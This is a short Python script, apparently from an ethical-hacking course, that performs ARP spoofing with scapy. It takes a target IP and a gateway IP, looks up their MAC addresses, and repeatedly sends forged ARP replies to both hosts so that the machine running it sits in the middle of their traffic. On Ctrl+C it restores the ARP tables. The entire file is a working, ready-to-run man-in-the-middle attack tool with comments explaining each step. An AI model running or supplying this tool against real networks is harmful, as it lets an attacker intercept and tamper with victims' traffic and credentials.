#!/usr/bin/env python

import argparse
import scapy.all as scapy
import time


# Function to get IP addresses of the host and gateway to target
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="IP Address of host to target")
    parser.add_argument("-g", "--gateway", dest="gateway", help="IP Address of gateway to target")
    options = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify a target IP address, use --help for more info.")
    elif not options.gateway:
        parser.error("[-] Please specify a gateway IP address, use --help for more info.")
    return options


# Function to get MAC addresses of certain IP addresses (same functionality as arping method and netdiscover)
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    # Gets a list of all the ARP packets that were successfully sent and replied to, and the response packets
    # Note: [1] would be used to retrieve the unanswered_list
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    # Gets the MAC address of the response packet (we use [0] because we expect only 1 result)
    return answered_list[0][1].hwsrc


# Function to create a false ARP reply to the targets
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # op=2 means to create an ARP response (op=1 would be a request).
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


# Function to restore the ARP tables in targets back to normal
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


options = get_arguments()
target_ip = options.target
gateway_ip = options.gateway

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CTRL + C ..... Quitting.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
